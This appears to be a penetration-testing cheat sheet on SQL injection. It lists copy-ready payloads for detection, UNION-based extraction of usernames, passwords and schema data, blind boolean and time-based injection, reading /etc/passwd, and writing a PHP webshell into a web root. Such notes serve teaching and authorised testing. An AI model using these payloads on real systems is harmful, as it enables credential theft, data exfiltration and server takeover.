# SQL Injection Fundamentals

SQL injection allows attackers to manipulate backend SQL queries by injecting malicious input, leading to authentication bypass, data exfiltration, and sometimes RCE.

## Detection

```sql
-- Basic test payloads
'
''
`
')
"))
' OR 1=1-- -
' AND 1=2-- -
```

## In-Band SQLi

```sql
-- UNION-based: discover column count
' ORDER BY 1-- -   -- increase until error
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -

-- Find string columns
' UNION SELECT 'a',NULL,NULL-- -

-- Extract data
' UNION SELECT username,password,NULL FROM users-- -

-- Extract DB info
' UNION SELECT version(),database(),user()-- -

-- List tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- List columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

## Blind SQLi

```sql
-- Boolean-based
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -

-- Time-based
' AND SLEEP(5)-- -                    -- MySQL
'; WAITFOR DELAY '0:0:5'-- -          -- MSSQL
' AND 1=(SELECT 1 FROM pg_sleep(5))-- - -- PostgreSQL
```

## Read/Write Files (MySQL)

```sql
-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -

-- Write webshell
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

## Comment Syntax by DB

| DB | Comment |
|----|---------|
| MySQL | `-- -` `#` |
| MSSQL | `--` |
| Oracle | `--` |
| SQLite | `--` |
